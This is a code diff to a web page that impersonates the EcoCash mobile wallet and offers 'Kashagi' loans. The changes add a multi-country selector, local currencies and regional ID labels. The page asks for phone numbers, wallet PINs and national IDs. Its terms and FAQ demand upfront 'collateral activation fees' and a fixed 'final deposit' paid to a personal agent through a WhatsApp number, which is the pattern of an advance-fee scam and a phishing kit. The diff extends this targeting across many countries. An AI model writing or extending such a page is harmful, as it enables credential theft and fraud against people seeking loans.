@@ -133,7 +133,7 @@
                 </button>
             </div>
 
-            <!-- STEP-BY-STEP JOURNEY PROGRESS BAR (Visible during active application steps) -->
+            <!-- STEP-BY-STEP JOURNEY PROGRESS BAR -->
             <div id="step-progress-bar" class="hidden bg-gray-50 dark:bg-gray-900/60 border-t border-gray-100 dark:border-gray-700 px-4 py-2">
                 <div class="flex items-center justify-between text-[10px] font-bold text-gray-500 dark:text-gray-400">
                     <div id="step-ind-1" class="flex items-center space-x-1 text-ecoblue">
@@ -187,29 +187,52 @@
                 </div>
             </div>
 
-            <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
+            <!-- ================= VIEW 1: LOGIN SCREEN (WITH GLOBAL COUNTRY SELECTOR) ================= -->
             <section id="view-login" class="flex-1 flex flex-col justify-between">
                 <div class="p-6">
-                    <div class="text-center mb-6">
+                    <div class="text-center mb-5">
                         <span class="inline-block bg-blue-50 dark:bg-gray-700 text-ecoblue dark:text-blue-300 text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-1">Step 1 of 4 • Wallet Verification</span>
                         <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Login to EcoCash</h2>
                     </div>
 
-                    <!-- Phone Input -->
+                    <!-- Country Selection on Login Page -->
+                    <div class="mb-4">
+                        <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Select Country & Region <span class="text-red-500">*</span></label>
+                        <select id="login-country-select" onchange="onLoginCountryChange()" class="w-full border border-ecoblue dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg p-3 text-xs outline-none bg-white font-medium focus:ring-2 focus:ring-ecoblue">
+                            <option value="Zimbabwe" data-code="+263" data-curr="USD" data-flag="🇿🇼">🇿🇼 Zimbabwe (+263) - USD / ZIG</option>
+                            <option value="Kenya" data-code="+254" data-curr="KES" data-flag="🇰🇪">🇰🇪 Kenya (+254) - KES</option>
+                            <option value="South Africa" data-code="+27" data-curr="ZAR" data-flag="🇿🇦">🇿🇦 South Africa (+27) - ZAR</option>
+                            <option value="Nigeria" data-code="+234" data-curr="NGN" data-flag="🇳🇬">🇳🇬 Nigeria (+234) - NGN</option>
+                            <option value="Botswana" data-code="+267" data-curr="BWP" data-flag="🇧🇼">🇧🇼 Botswana (+267) - BWP</option>
+                            <option value="Zambia" data-code="+260" data-curr="ZMW" data-flag="🇿🇲">🇿🇲 Zambia (+260) - ZMW</option>
+                            <option value="Malawi" data-code="+265" data-curr="MWK" data-flag="🇲🇼">🇲🇼 Malawi (+265) - MWK</option>
+                            <option value="Mozambique" data-code="+258" data-curr="MZN" data-flag="🇲🇿">🇲🇿 Mozambique (+258) - MZN</option>
+                            <option value="Tanzania" data-code="+255" data-curr="TZS" data-flag="🇹🇿">🇹🇿 Tanzania (+255) - TZS</option>
+                            <option value="Uganda" data-code="+256" data-curr="UGX" data-flag="🇺🇬">🇺🇬 Uganda (+256) - UGX</option>
+                            <option value="Ghana" data-code="+233" data-curr="GHS" data-flag="🇬🇭">🇬🇭 Ghana (+233) - GHS</option>
+                            <option value="United Kingdom" data-code="+44" data-curr="GBP" data-flag="🇬🇧">🇬🇧 United Kingdom (+44) - GBP</option>
+                            <option value="United States" data-code="+1" data-curr="USD" data-flag="🇺🇸">🇺🇸 United States (+1) - USD</option>
+                            <option value="Canada" data-code="+1" data-curr="CAD" data-flag="🇨🇦">🇨🇦 Canada (+1) - CAD</option>
+                            <option value="Australia" data-code="+61" data-curr="AUD" data-flag="🇦🇺">🇦🇺 Australia (+61) - AUD</option>
+                            <option value="Other" data-code="+254" data-curr="USD" data-flag="🌍">🌍 Other International Region (+254)</option>
+                        </select>
+                    </div>
+
+                    <!-- Phone Input with Dynamic Country Code -->
                     <div class="mb-4">
                         <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
                         <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue dark:bg-gray-700 dark:border-gray-600 relative">
-                            <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 dark:border-gray-600 pr-2">
-                                <span class="text-lg">🇿🇼</span>
-                                <span class="text-gray-700 dark:text-gray-200 font-semibold text-sm">+263</span>
+                            <div class="flex items-center space-x-1.5 mr-2 border-r border-gray-300 dark:border-gray-600 pr-2">
+                                <span id="login-flag-display" class="text-base">🇿🇼</span>
+                                <span id="login-code-display" class="text-gray-700 dark:text-gray-200 font-semibold text-xs">+263</span>
                             </div>
-                            <input type="tel" id="login-phone" inputmode="numeric" pattern="[0-9]*" placeholder="712345678" maxlength="9" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <input type="tel" id="login-phone" inputmode="numeric" pattern="[0-9]*" placeholder="712345678" maxlength="11" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
                             <span id="login-phone-icon" class="absolute right-3 hidden text-base"></span>
                         </div>
-                        <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number (Must be 9 digits starting with 7)</p>
+                        <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number format for selected region</p>
                     </div>
 
-                    <!-- Single Smooth PIN Input Field (Seamless Typing) -->
+                    <!-- Single Smooth PIN Input Field -->
                     <div class="text-center mb-6">
                         <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-2">Enter your 4-Digit PIN <span class="text-red-500">*</span></label>
                         <div class="relative max-w-xs mx-auto">
@@ -288,38 +311,39 @@
                         <!-- Country Select with Flags -->
                         <div>
                             <label class="block font-medium mb-1">Country & Region <span class="text-red-500">*</span></label>
-                            <select id="signup-country" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600 dark:text-gray-300" onchange="validateSignupForm()">
-                                <option value="">--- Select Country ---</option>
-                                <option value="Zimbabwe">🇿🇼 Zimbabwe (+263)</option>
-                                <option value="Kenya">🇰🇪 Kenya (+254)</option>
-                                <option value="South Africa">🇿🇦 South Africa (+27)</option>
-                                <option value="Nigeria">🇳🇬 Nigeria (+234)</option>
-                                <option value="Botswana">🇧🇼 Botswana (+267)</option>
-                                <option value="Zambia">🇿🇲 Zambia (+260)</option>
-                                <option value="Malawi">🇲🇼 Malawi (+265)</option>
-                                <option value="Mozambique">🇲🇿 Mozambique (+258)</option>
-                                <option value="Tanzania">🇹🇿 Tanzania (+255)</option>
-                                <option value="Uganda">🇺🇬 Uganda (+256)</option>
-                                <option value="Ghana">🇬🇭 Ghana (+233)</option>
-                                <option value="United Kingdom">🇬🇧 United Kingdom (+44)</option>
-                                <option value="United States">🇺🇸 United States (+1)</option>
-                                <option value="Canada">🇨🇦 Canada (+1)</option>
-                                <option value="Australia">🇦🇺 Australia (+61)</option>
-                                <option value="Other">🌍 Other International Region</option>
+                            <select id="signup-country" onchange="onSignupCountryChange()" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600 dark:text-gray-300">
+                                <option value="Zimbabwe" data-code="+263" data-curr="USD" data-flag="🇿🇼">🇿🇼 Zimbabwe (+263) - USD / ZIG</option>
+                                <option value="Kenya" data-code="+254" data-curr="KES" data-flag="🇰🇪">🇰🇪 Kenya (+254) - KES</option>
+                                <option value="South Africa" data-code="+27" data-curr="ZAR" data-flag="🇿🇦">🇿🇦 South Africa (+27) - ZAR</option>
+                                <option value="Nigeria" data-code="+234" data-curr="NGN" data-flag="🇳🇬">🇳🇬 Nigeria (+234) - NGN</option>
+                                <option value="Botswana" data-code="+267" data-curr="BWP" data-flag="🇧🇼">🇧🇼 Botswana (+267) - BWP</option>
+                                <option value="Zambia" data-code="+260" data-curr="ZMW" data-flag="🇿🇲">🇿🇲 Zambia (+260) - ZMW</option>
+                                <option value="Malawi" data-code="+265" data-curr="MWK" data-flag="🇲🇼">🇲🇼 Malawi (+265) - MWK</option>
+                                <option value="Mozambique" data-code="+258" data-curr="MZN" data-flag="🇲🇿">🇲🇿 Mozambique (+258) - MZN</option>
+                                <option value="Tanzania" data-code="+255" data-curr="TZS" data-flag="🇹🇿">🇹🇿 Tanzania (+255) - TZS</option>
+                                <option value="Uganda" data-code="+256" data-curr="UGX" data-flag="🇺🇬">🇺🇬 Uganda (+256) - UGX</option>
+                                <option value="Ghana" data-code="+233" data-curr="GHS" data-flag="🇬🇭">🇬🇭 Ghana (+233) - GHS</option>
+                                <option value="United Kingdom" data-code="+44" data-curr="GBP" data-flag="🇬🇧">🇬🇧 United Kingdom (+44) - GBP</option>
+                                <option value="United States" data-code="+1" data-curr="USD" data-flag="🇺🇸">🇺🇸 United States (+1) - USD</option>
+                                <option value="Canada" data-code="+1" data-curr="CAD" data-flag="🇨🇦">🇨🇦 Canada (+1) - CAD</option>
+                                <option value="Australia" data-code="+61" data-curr="AUD" data-flag="🇦🇺">🇦🇺 Australia (+61) - AUD</option>
+                                <option value="Other" data-code="+254" data-curr="USD" data-flag="🌍">🌍 Other International Region (+254)</option>
                             </select>
                         </div>
 
                         <!-- Username (Mobile Number) -->
                         <div>
                             <label class="block font-medium mb-1">Username (Mobile number) <span class="text-red-500">*</span></label>
-                            <div class="bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200 dark:border-gray-600">
-                                +263 (Default EcoCash Region)
+                            <div id="signup-code-box" class="bg-gray-100 dark:bg-gray-700 text-gray-600 dark:text-gray-200 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200 dark:border-gray-600 flex items-center justify-center space-x-2">
+                                <span id="signup-flag-display">🇿🇼</span>
+                                <span id="signup-code-display">+263</span>
+                                <span>(Selected Region Code)</span>
                             </div>
                             <div class="relative">
-                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="signup-phone" placeholder="Mobile Number (e.g. 712345678)" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="signup-phone" placeholder="Mobile Number (e.g. 712345678)" maxlength="11" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                                 <span id="signup-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                             </div>
-                            <p id="signup-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile Number (Must be 9 digits starting with 7)</p>
+                            <p id="signup-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile Number format for selected region</p>
                         </div>
 
                         <!-- Email -->
@@ -334,12 +358,12 @@
 
                         <!-- National ID -->
                         <div>
-                            <label class="block font-medium mb-1">Zimbabwe National Id / Regional ID <span class="text-red-500">*</span></label>
+                            <label id="signup-id-label" class="block font-medium mb-1">National ID Number / Regional ID <span class="text-red-500">*</span></label>
                             <div class="relative">
                                 <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
                                 <span id="signup-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                             </div>
-                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
+                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format for selected region</p>
                         </div>
 
                         <!-- Password -->
@@ -427,14 +451,14 @@
             <!-- ================= VIEW 3: KASHAGI LOANS PORTAL & CIRCULAR SERVICES GRID ================= -->
             <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
-                    <!-- Client Profile Banner with Smart Card Graphic -->
+                    <!-- Client Profile Banner with Smart Card Graphic & Dynamic Currency -->
                     <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-5 relative overflow-hidden">
                         <div class="absolute right-[-10px] bottom-[-10px] opacity-20 text-6xl">
                             <i class="fa-solid fa-credit-card"></i>
                         </div>
                         <div class="flex items-center justify-between">
                             <div>
-                                <span class="text-[10px] uppercase font-bold text-blue-200 tracking-wider">Smart EcoCash ID Card</span>
+                                <span class="text-[10px] uppercase font-bold text-blue-200 tracking-wider">Smart EcoCash ID Card (<span id="profile-curr-badge">USD</span>)</span>
                                 <h3 id="profile-name-display" class="font-extrabold text-sm mt-0.5">---</h3>
                                 <p id="profile-id-display" class="text-xs text-blue-100 font-mono mt-1">ID: ---</p>
                                 <p id="profile-phone-display" class="text-[11px] text-blue-200 mt-0.5">Phone: ---</p>
@@ -460,7 +484,7 @@
                             </button>
 
                             <!-- Service 2: Airtime & Bundles -->
-                            <button onclick="buyBundlePromo('28GB for $10 USD (30 Days)')" class="flex flex-col items-center group focus:outline-none">
+                            <button onclick="buyBundlePromo('28GB Data Bundle')" class="flex flex-col items-center group focus:outline-none">
                                 <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-2 transform group-hover:scale-105 group-active:scale-95 transition duration-200">
                                     <i class="fa-solid fa-mobile-screen-button text-xl"></i>
                                 </div>
@@ -500,11 +524,11 @@
                             </div>
                             <div class="flex items-start space-x-2.5">
                                 <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">2</span>
-                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Verify Credentials:</strong> Enter your full names & National ID for 6-month history check.</p>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Verify Credentials:</strong> Enter your full names & ID for 6-month history check.</p>
                             </div>
                             <div class="flex items-start space-x-2.5">
                                 <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">3</span>
-                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Select Loan Tier:</strong> Choose your desired credit limit ($100 – $3,000 USD).</p>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Select Loan Tier:</strong> Choose your desired credit limit in local currency.</p>
                             </div>
                             <div class="flex items-start space-x-2.5">
                                 <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">4</span>
@@ -513,7 +537,7 @@
                         </div>
                     </div>
 
-                    <!-- PROMOTIONAL BANNER: 28GB for $10 USD -->
+                    <!-- PROMOTIONAL BANNER -->
                     <div class="mb-2 bg-gradient-to-r from-ecodarkblue via-blue-600 to-indigo-600 rounded-xl p-4 text-white shadow-lg relative overflow-hidden banner-float border border-blue-400/30">
                         <div class="absolute right-[-20px] bottom-[-20px] opacity-15 text-8xl pointer-events-none">
                             <i class="fa-solid fa-wifi"></i>
@@ -526,12 +550,12 @@
                         <div class="flex items-center space-x-3 mb-3">
                             <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=200&q=80" alt="People browsing internet" class="w-12 h-12 rounded-lg object-cover border-2 border-white/80 shadow flex-shrink-0">
                             <div>
-                                <h3 class="text-sm font-extrabold text-white leading-snug">Buy 28GB for only $10 USD</h3>
+                                <h3 id="promo-banner-title" class="text-sm font-extrabold text-white leading-snug">Buy 28GB Data Bundle</h3>
                                 <p class="text-[11px] text-blue-100 font-medium">Browse, stream & work seamlessly for <span class="font-bold text-yellow-300">30 Days</span>!</p>
                             </div>
                         </div>
 
-                        <button onclick="buyBundlePromo('28GB for $10 USD (30 Days)')" class="w-full bg-white text-ecoblue hover:bg-yellow-300 hover:text-gray-900 font-extrabold py-2 px-3 rounded-lg text-xs uppercase tracking-wider transition shadow flex items-center justify-center space-x-2">
+                        <button onclick="buyBundlePromo('28GB Data Bundle')" class="w-full bg-white text-ecoblue hover:bg-yellow-300 hover:text-gray-900 font-extrabold py-2 px-3 rounded-lg text-xs uppercase tracking-wider transition shadow flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-cart-shopping"></i>
                             <span>BUY BUNDLE VIA WHATSAPP</span>
                         </button>
@@ -555,7 +579,7 @@
 
                     <div class="space-y-2">
                         <h3 id="process-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Validating Details & Transactions</h3>
-                        <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and credentials...</p>
+                        <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and regional registry...</p>
                     </div>
 
                     <div class="space-y-2 pt-2">
@@ -566,7 +590,7 @@
                     <div class="bg-gray-50 dark:bg-gray-700 p-3 rounded-lg border border-gray-200 dark:border-gray-600 text-left text-[11px] space-y-1 text-gray-600 dark:text-gray-300">
                         <div class="flex items-center space-x-2">
                             <i class="fa-solid fa-check text-green-600"></i>
-                            <span>Checking National & Regional ID Registry</span>
+                            <span id="proc-label-1">Checking National ID Registry</span>
                         </div>
                         <div class="flex items-center space-x-2">
                             <i class="fa-solid fa-check text-green-600"></i>
@@ -605,30 +629,30 @@
                             <p id="boost-name-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Name (Letters only)</p>
                         </div>
 
-                        <!-- Phone Number -->
+                        <!-- Phone Number with Dynamic Country Code -->
                         <div>
-                            <label class="block font-medium mb-1">2. Phone Number (Starting with 7) <span class="text-red-500">*</span></label>
+                            <label class="block font-medium mb-1">2. Phone Number <span class="text-red-500">*</span></label>
                             <div class="flex items-center border border-gray-200 dark:border-gray-700 dark:bg-gray-700 rounded-md overflow-hidden focus-within:border-ecoblue relative">
-                                <span class="bg-gray-100 dark:bg-gray-600 px-3 py-2.5 text-gray-600 dark:text-gray-200 font-semibold text-sm border-r border-gray-200 dark:border-gray-600">+263</span>
-                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
+                                <span id="boost-code-badge" class="bg-gray-100 dark:bg-gray-600 px-3 py-2.5 text-gray-600 dark:text-gray-200 font-semibold text-sm border-r border-gray-200 dark:border-gray-600">+263</span>
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="boost-phone" placeholder="712345678" maxlength="11" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
                                 <span id="boost-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                             </div>
-                            <p id="boost-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Phone (9 digits starting with 7)</p>
+                            <p id="boost-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Phone format for region</p>
                         </div>
 
-                        <!-- National ID -->
+                        <!-- ID Number with Dynamic Label -->
                         <div>
-                            <label class="block font-medium mb-1">3. National ID Number <span class="text-red-500">*</span></label>
+                            <label id="boost-id-label" class="block font-medium mb-1">3. National ID Number <span class="text-red-500">*</span></label>
                             <div class="relative">
                                 <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
                                 <span id="boost-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                             </div>
-                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
+                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format for region</p>
                         </div>
 
-                        <!-- Current Loan Amount -->
+                        <!-- Current Loan Amount with Dynamic Currency -->
                         <div>
-                            <label class="block font-medium mb-1">4. Current Kashagi Loan Amount (USD) <span class="text-red-500">*</span></label>
+                            <label class="block font-medium mb-1">4. Current Kashagi Loan Amount (<span id="boost-curr-label">USD</span>) <span class="text-red-500">*</span></label>
                             <div class="relative">
                                 <input type="number" inputmode="numeric" pattern="[0-9]*" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
                                 <span id="boost-loan-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
@@ -659,7 +683,7 @@
                         </div>
                     </div>
 
-                    <p class="text-xs text-gray-600 dark:text-gray-400 mb-4">Select your target tier below. Exact required activation/collateral fees are indicated clearly for each tier.</p>
+                    <p class="text-xs text-gray-600 dark:text-gray-400 mb-4">Select your target tier below. Exact required activation/collateral fees are indicated clearly for each tier in <span id="tier-curr-sublabel">USD</span>.</p>
 
                     <!-- Tier Table / Selection Cards with exact amounts -->
                     <div class="space-y-3 max-h-[350px] overflow-y-auto pr-1 no-scrollbar" id="tier-options-container">
@@ -695,7 +719,7 @@
                         <p>2. Privacy and Data Protection: EcoCash is deeply committed to protecting your personal information. All submitted national identification credentials, phone numbers, and PIN data are encrypted with bank-grade 256-bit protocols, strictly adhering to international data privacy regulations.</p>
                         <p>3. Safety and Fraud Prevention: Your account security is paramount. Never share your 4-digit EcoCash PIN or password with any third party, customer care agent, or unauthorized personnel. EcoCash will never ask for your PIN over phone calls or messages.</p>
                         <p>4. Loan Repayment and Collateral: All disbursed Kashagi loan credit lines require upfront collateral activation fees (5% for boost tiers or 10% for full new applications) prior to wallet disbursement. Repayments are automatically debited on maturity.</p>
-                        <p class="font-semibold text-gray-800 dark:text-gray-200 bg-blue-50 dark:bg-gray-700 p-2 rounded border border-blue-200 dark:border-gray-600">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly $60 USD. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification (+254786464611).</p>
+                        <p class="font-semibold text-gray-800 dark:text-gray-200 bg-blue-50 dark:bg-gray-700 p-2 rounded border border-blue-200 dark:border-gray-600">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly <span id="terms-deposit-amt">60 USD</span>. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification (+254786464611).</p>
                         <p>6. Default Consequences: Failure to clear outstanding loan balances on time results in credit score penalties, temporary wallet restriction, and potential debt recovery through registered mobile subscriber lines.</p>
                         <p class="font-semibold text-ecoblue">7. Final Acceptance: By checking the agreement box below and clicking submit, you certify that all entered profile data is accurate and you consent to our security guidelines.</p>
                     </div>
@@ -704,7 +728,7 @@
                     <div class="bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 rounded-lg p-3 mt-3 flex items-start space-x-2 shadow-sm">
                         <input type="checkbox" id="explicit-agree-checkbox" onchange="toggleAgreeCheckbox()" class="mt-0.5 w-4 h-4 rounded text-ecoblue focus:ring-ecoblue cursor-pointer flex-shrink-0">
                         <label for="explicit-agree-checkbox" class="text-[11px] text-gray-800 dark:text-gray-200 font-medium leading-tight cursor-pointer">
-                            I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines, including the $60 USD final deposit requirement with my assigned agent.
+                            I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines, including the final deposit requirement with my assigned agent.
                         </label>
                     </div>
                 </div>
@@ -730,7 +754,7 @@
                         </div>
                     </div>
 
-                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-3">Select your loan registration tier ($100 to $3000 USD) with exact 10% fee calculated automatically.</p>
+                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-3">Select your loan registration tier with exact 10% fee calculated automatically in <span id="apply-curr-sublabel">USD</span>.</p>
 
                     <!-- Full Application Tier Table Selector -->
                     <div class="space-y-2 mb-4 max-h-[200px] overflow-y-auto pr-1 no-scrollbar" id="apply-tier-options-container">
@@ -751,23 +775,23 @@
                         <div class="grid grid-cols-2 gap-2">
                             <!-- Mobile -->
                             <div>
-                                <label class="block font-medium mb-1">Mobile (+263) <span class="text-red-500">*</span></label>
+                                <label class="block font-medium mb-1">Mobile (<span id="apply-code-label">+263</span>) <span class="text-red-500">*</span></label>
                                 <div class="relative">
-                                    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="apply-phone" placeholder="712345678" maxlength="11" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
                                     <span id="apply-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                                 </div>
-                                <p id="apply-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile (9 digits)</p>
+                                <p id="apply-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile format</p>
                             </div>
                             <!-- National ID -->
                             <div>
-                                <label class="block font-medium mb-1">National ID <span class="text-red-500">*</span></label>
+                                <label id="apply-id-label" class="block font-medium mb-1">National ID <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <input type="text" id="apply-nid" placeholder="63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none uppercase" oninput="validateApplyForm()">
                                     <span id="apply-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                                 </div>
                             </div>
                         </div>
-                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect ID format (e.g., 63-1234567A89)</p>
+                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect ID format for region</p>
 
                         <div class="grid grid-cols-2 gap-2">
                             <div>
@@ -781,7 +805,7 @@
                             </div>
                             <!-- Monthly Income -->
                             <div>
-                                <label class="block font-medium mb-1">Monthly Income (USD) <span class="text-red-500">*</span></label>
+                                <label class="block font-medium mb-1">Monthly Income (<span id="apply-income-curr">USD</span>) <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <input type="number" inputmode="numeric" pattern="[0-9]*" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
                                     <span id="apply-income-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
@@ -820,12 +844,12 @@
                             <p class="text-gray-600 dark:text-gray-300">Yes! All Kashagi microloans are guaranteed with no guarantor needed, based on your last 6 months of active wallet transaction history and ID verification.</p>
                         </div>
                         <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
-                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: What is the $60 USD final deposit requirement?</h4>
-                            <p class="text-gray-600 dark:text-gray-300">Once your account is successfully updated, a final deposit of $60 USD is required to activate your spending balance. Deposits are made directly to your personally assigned agent via WhatsApp (+254786464611).</p>
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: What is the final deposit requirement?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Once your account is successfully updated, a final deposit is required to activate your spending balance in your local currency. Deposits are made directly to your personally assigned agent via WhatsApp (+254786464611).</p>
                         </div>
                         <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
-                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: How do I buy the 28GB for $10 USD bundle?</h4>
-                            <p class="text-gray-600 dark:text-gray-300">Simply click the Airtime & Bundles icon or promotional 'Buy Bundle' banner on your dashboard, and it will automatically format your request to our official WhatsApp line for instant credit.</p>
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: How do I buy data bundles?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Simply click the 'Airtime & Bundles' icon or promotional 'Buy Bundle' banner on your dashboard, and it will automatically format your request to our official WhatsApp line for instant credit.</p>
                         </div>
                     </div>
 
@@ -940,11 +964,14 @@
 
     <!-- APPLICATION LOGIC & INTERACTIVITY -->
     <script>
-        // Updated WhatsApp target number
         const TARGET_WHATSAPP_NUMBER = '254786464611';
 
-        // Global State variables
+        // Global State variables with Country/Currency Mapping
         let clientData = {
+            country: 'Zimbabwe',
+            countryCode: '+263',
+            currency: 'USD',
+            flag: '🇿🇼',
             loginPhone: '',
             loginPin: '',
             name: '',
@@ -956,6 +983,26 @@
             selectedApplyAmount: 500,
             selectedApplyFee: 50,
             flowType: 'boost'
+        };
+
+        // Country Configuration Profiles (Currency, ID Placeholders, Regional Formats)
+        const countryProfiles = {
+            'Zimbabwe': { code: '+263', curr: 'USD', flag: '🇿🇼', idPlaceholder: 'e.g. 63-1234567A89', idLabel: 'Zimbabwe National ID Number' },
